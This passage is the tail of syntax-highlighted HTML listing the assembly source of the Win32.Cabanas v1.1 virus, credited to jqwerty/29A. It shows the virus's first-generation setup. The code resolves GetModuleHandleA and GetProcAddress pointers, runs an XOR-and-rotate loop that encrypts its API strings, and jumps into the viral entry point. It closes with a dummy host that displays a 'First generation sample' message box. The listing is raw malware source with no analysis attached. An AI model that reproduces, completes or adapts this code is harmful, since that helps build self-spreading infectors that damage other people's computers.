        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">delta_host</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ref</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">old_base</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ref</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pfnGMH</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ref</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc9">.if</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">==</span><span class="sc0"> </span><span class="sc2">25FFh</span><span class="sc0">         </span><span class="sc1">;jmp [xxxxxxxx]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc9">.endif</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddGetModuleHandleA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ref</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;set GetModuleHandleA RVA pointer</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pfnGPA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ref</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc9">.if</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">==</span><span class="sc0"> </span><span class="sc2">25FFh</span><span class="sc0">         </span><span class="sc1">;jmp [xxxxxxxx]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc9">.endif</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddGetProcAddress</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ref</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;set GetProcAddress RVA pointer</span><span class="sc0">

        </span><span class="sc6">cld</span><span class="sc0">                             </span><span class="sc1">;encrypt API stringz</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">ve_string_size</span><span class="sc0">              
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ve_stringz</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ref</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">encrypt_stringz</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">  
        </span><span class="sc6">lahf</span><span class="sc0">            
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B5h</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">sahf</span><span class="sc0">
        </span><span class="sc9">.if</span><span class="sc0">     </span><span class="sc10">zero?</span><span class="sc0">
        </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc9">.endif</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">encrypt_stringz</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">v_end2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_stringz</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">v_stringz</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ref</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">v_start</span><span class="sc0">

</span><span class="sc5">pfnGMH</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc0">
</span><span class="sc5">pfnGPA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">

</span><span class="sc1">;Host code starts here</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc5">host</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MB_OK</span><span class="sc0">                                   </span><span class="sc1">;display message box</span><span class="sc0">
        </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"(c) Win32.Cabanas v1.1 by jqwerty/29A"</span><span class="sc0">
        </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"First generation sample"</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">NULL</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MessageBoxA</span><span class="sc0">

</span><span class="sc5">exit</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;exit host</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">

        </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">first_generation</span><span class="sc0">
</span></div></body>
</html>
